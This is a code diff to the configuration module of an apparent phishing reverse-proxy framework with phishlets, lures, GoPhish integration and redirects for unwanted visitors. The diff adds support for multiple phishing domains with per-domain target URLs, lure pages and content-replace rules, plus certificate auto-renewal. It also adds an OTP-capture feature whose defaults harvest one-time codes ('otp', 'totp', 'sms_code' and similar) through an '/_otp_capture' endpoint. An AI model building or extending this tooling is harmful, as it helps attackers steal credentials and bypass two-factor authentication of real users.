@@ -66,14 +66,50 @@ type GoPhishConfig struct {
 }
 
 type GeneralConfig struct {
-	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	Domain               string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4              string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4         string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4             string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl            string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort            int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort              int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert             bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	CertRenewalInterval  int    `mapstructure:"cert_renewal_interval" json:"cert_renewal_interval" yaml:"cert_renewal_interval"`
+}
+
+type DomainConfig struct {
+	Domain      string            `mapstructure:"domain" json:"domain" yaml:"domain"`
+	TargetUrl   string            `mapstructure:"target_url" json:"target_url" yaml:"target_url"`
+	LurePage    string            `mapstructure:"lure_page" json:"lure_page" yaml:"lure_page"`
+	CertPath    string            `mapstructure:"cert_path" json:"cert_path" yaml:"cert_path"`
+	KeyPath     string            `mapstructure:"key_path" json:"key_path" yaml:"key_path"`
+	PhishletMap map[string]string `mapstructure:"phishlet_map" json:"phishlet_map" yaml:"phishlet_map"`
+	UnauthUrl   string            `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	ReplaceRules []ReplaceRule   `mapstructure:"replace_rules" json:"replace_rules" yaml:"replace_rules"`
+}
+
+type ReplaceRule struct {
+	Type    string `mapstructure:"type" json:"type" yaml:"type"`
+	Pattern string `mapstructure:"pattern" json:"pattern" yaml:"pattern"`
+	Replace string `mapstructure:"replace" json:"replace" yaml:"replace"`
+}
+
+type CertRenewalConfig struct {
+	Enabled        bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	CheckInterval  int    `mapstructure:"check_interval_hours" json:"check_interval_hours" yaml:"check_interval_hours"`
+	RenewDaysBefore int   `mapstructure:"renew_days_before" json:"renew_days_before" yaml:"renew_days_before"`
+	EmailNotify    string `mapstructure:"email_notify" json:"email_notify" yaml:"email_notify"`
+	SmtpHost       string `mapstructure:"smtp_host" json:"smtp_host" yaml:"smtp_host"`
+	SmtpPort       int    `mapstructure:"smtp_port" json:"smtp_port" yaml:"smtp_port"`
+	SmtpUser       string `mapstructure:"smtp_user" json:"smtp_user" yaml:"smtp_user"`
+	SmtpPassword   string `mapstructure:"smtp_password" json:"smtp_password" yaml:"smtp_password"`
+}
+
+type OtpCaptureConfig struct {
+	Enabled      bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	FieldNames   []string `mapstructure:"field_names" json:"field_names" yaml:"field_names"`
+	DataAttr     string   `mapstructure:"data_attr" json:"data_attr" yaml:"data_attr"`
+	EndpointPath string   `mapstructure:"endpoint_path" json:"endpoint_path" yaml:"endpoint_path"`
 }
 
 type Config struct {
@@ -90,18 +126,25 @@ type Config struct {
 	lures           []*Lure
 	lureIds         []string
 	subphishlets    []*SubPhishlet
+	domains         []*DomainConfig
+	certRenewal     *CertRenewalConfig
+	otpCapture      *OtpCaptureConfig
+	replaceRules     []ReplaceRule
 	cfg             *viper.Viper
 }
 
 const (
-	CFG_GENERAL      = "general"
-	CFG_CERTIFICATES = "certificates"
-	CFG_LURES        = "lures"
-	CFG_PROXY        = "proxy"
-	CFG_PHISHLETS    = "phishlets"
-	CFG_BLACKLIST    = "blacklist"
-	CFG_SUBPHISHLETS = "subphishlets"
-	CFG_GOPHISH      = "gophish"
+	CFG_GENERAL       = "general"
+	CFG_CERTIFICATES  = "certificates"
+	CFG_LURES         = "lures"
+	CFG_PROXY         = "proxy"
+	CFG_PHISHLETS     = "phishlets"
+	CFG_BLACKLIST     = "blacklist"
+	CFG_SUBPHISHLETS  = "subphishlets"
+	CFG_GOPHISH       = "gophish"
+	CFG_DOMAINS       = "domains"
+	CFG_CERT_RENEWAL  = "cert_renewal"
+	CFG_OTP_CAPTURE   = "otp_capture"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -116,6 +159,18 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishletNames:   []string{},
 		lures:           []*Lure{},
 		blacklistConfig: &BlacklistConfig{},
+		domains:         []*DomainConfig{},
+		certRenewal: &CertRenewalConfig{
+			Enabled:         true,
+			CheckInterval:   24,
+			RenewDaysBefore: 30,
+		},
+		otpCapture: &OtpCaptureConfig{
+			Enabled:      false,
+			FieldNames:   []string{"otp", "totp", "code", "verification_code", "sms_code"},
+			DataAttr:     "data-otp-input",
+			EndpointPath: "/_otp_capture",
+		},
 	}
 
 	c.cfg = viper.New()
@@ -183,6 +238,28 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+	c.cfg.UnmarshalKey(CFG_DOMAINS, &c.domains)
+	c.cfg.UnmarshalKey(CFG_CERT_RENEWAL, &c.certRenewal)
+	c.cfg.UnmarshalKey(CFG_OTP_CAPTURE, &c.otpCapture)
+
+	if c.general.CertRenewalInterval == 0 {
+		c.general.CertRenewalInterval = 24
+	}
+	if c.certRenewal.CheckInterval == 0 {
+		c.certRenewal.CheckInterval = 24
+	}
+	if c.certRenewal.RenewDaysBefore == 0 {
+		c.certRenewal.RenewDaysBefore = 30
+	}
+	if c.otpCapture.DataAttr == "" {
+		c.otpCapture.DataAttr = "data-otp-input"
+	}
+	if c.otpCapture.EndpointPath == "" {
+		c.otpCapture.EndpointPath = "/_otp_capture"
+	}
+	if len(c.otpCapture.FieldNames) == 0 {
+		c.otpCapture.FieldNames = []string{"otp", "totp", "code", "verification_code", "sms_code"}
+	}
 
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
@@ -213,8 +290,8 @@ func (c *Config) SavePhishlets() {
 }
 
 func (c *Config) SetSiteHostname(site string, hostname string) bool {
-	if c.general.Domain == "" {
-		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
+	if !c.IsAnyDomainSet() {
+		log.Error("you need to set server top-level domain, first. type: config domain your-domain.com")
 		return false
 	}
 	pl, err := c.GetPhishlet(site)
@@ -226,8 +303,22 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 		log.Error("phishlet is a template - can't set hostname")
 		return false
 	}
+	validDomain := false
 	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
-		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
+		for _, d := range c.domains {
+			if hostname == d.Domain || strings.HasSuffix(hostname, "."+d.Domain) {
+				validDomain = true
+				break
+			}
+		}
+		if !validDomain {
+			log.Error("phishlet hostname must end with one of the configured base domains")
+			return false
+		}
+	} else {
+		validDomain = true
+	}
+	if !validDomain {
 		return false
 	}
 	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
@@ -822,4 +913,147 @@ func (c *Config) GetGoPhishApiKey() string {
 
 func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
+}
+
+func (c *Config) AddDomain(domain *DomainConfig) {
+	c.domains = append(c.domains, domain)
+	c.cfg.Set(CFG_DOMAINS, c.domains)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetDomains() []*DomainConfig {
+	return c.domains
+}
+
+func (c *Config) GetDomainByName(domain string) *DomainConfig {
+	for _, d := range c.domains {
+		if d.Domain == domain {
+			return d
+		}
+	}
+	return nil
+}
+
+func (c *Config) DeleteDomain(domain string) error {
+	for i, d := range c.domains {
+		if d.Domain == domain {
+			c.domains = append(c.domains[:i], c.domains[i+1:]...)
+			c.cfg.Set(CFG_DOMAINS, c.domains)
+			c.cfg.WriteConfig()
+			return nil
+		}
+	}
+	return fmt.Errorf("domain '%s' not found", domain)
+}
+
+func (c *Config) IsAnyDomainSet() bool {
+	if c.general.Domain != "" {
+		return true
+	}
+	return len(c.domains) > 0
+}
+
+func (c *Config) GetAllBaseDomains() []string {
+	domains := []string{}
+	if c.general.Domain != "" {
+		domains = append(domains, c.general.Domain)
+	}
+	for _, d := range c.domains {
+		if d.Domain != "" && !stringExists(d.Domain, domains) {
+			domains = append(domains, d.Domain)
+		}
+	}
+	return domains
+}
+
+func (c *Config) GetAllSiteHostnames() []string {
+	hostnames := []string{}
+	for site, plc := range c.phishletConfig {
+		if plc.Enabled && plc.Hostname != "" {
+			hostnames = append(hostnames, plc.Hostname)
+			if pl, ok := c.phishlets[site]; ok {
+				baseDomain, ok2 := c.GetSiteDomain(site)
+				if ok2 {
+					for _, ph := range pl.proxyHosts {
+						sub := ph.phish_subdomain
+						h := combineHost(sub, baseDomain)
+						if !stringExists(h, hostnames) {
+							hostnames = append(hostnames, h)
+						}
+					}
+				}
+			}
+		}
+	}
+	return hostnames
+}
+
+func (c *Config) GetBaseDomainForHost(host string) string {
+	host = strings.ToLower(host)
+	if strings.HasSuffix(host, "."+c.general.Domain) || host == c.general.Domain {
+		return c.general.Domain
+	}
+	for _, d := range c.domains {
+		if strings.HasSuffix(host, "."+d.Domain) || host == d.Domain {
+			return d.Domain
+		}
+	}
+	return ""
+}
+
+func (c *Config) GetUnauthUrlForDomain(domain string) string {
+	for _, d := range c.domains {
+		if d.Domain == domain && d.UnauthUrl != "" {
+			return d.UnauthUrl
+		}
+	}
+	if c.general.UnauthUrl != "" {
+		return c.general.UnauthUrl
+	}
+	return DEFAULT_UNAUTH_URL
+}
+
+func (c *Config) GetCertRenewalConfig() *CertRenewalConfig {
+	return c.certRenewal
+}
+
+func (c *Config) SetCertRenewalConfig(cfg *CertRenewalConfig) {
+	c.certRenewal = cfg
+	c.cfg.Set(CFG_CERT_RENEWAL, c.certRenewal)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetOtpCaptureConfig() *OtpCaptureConfig {
+	return c.otpCapture
+}
+
+func (c *Config) SetOtpCaptureConfig(cfg *OtpCaptureConfig) {
+	c.otpCapture = cfg
+	c.cfg.Set(CFG_OTP_CAPTURE, c.otpCapture)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetReplaceRulesForDomain(domain string) []ReplaceRule {
+	for _, d := range c.domains {
+		if d.Domain == domain {
+			return d.ReplaceRules
+		}
+	}
+	return []ReplaceRule{}
+}
+
+func (c *Config) GetReplaceRulesForHost(host string) []ReplaceRule {
+	var allRules []ReplaceRule
+	baseDomain := c.GetBaseDomainForHost(host)
+	if baseDomain != "" {
+		rules := c.GetReplaceRulesForDomain(baseDomain)
+		allRules = append(allRules, rules...)
+	}
+	allRules = append(allRules, c.replaceRules...)
+	return allRules
+}
+
+func (c *Config) SaveDomains() {
+	c.cfg.Set(CFG_DOMAINS, c.domains)
+	c.cfg.WriteConfig()
 }
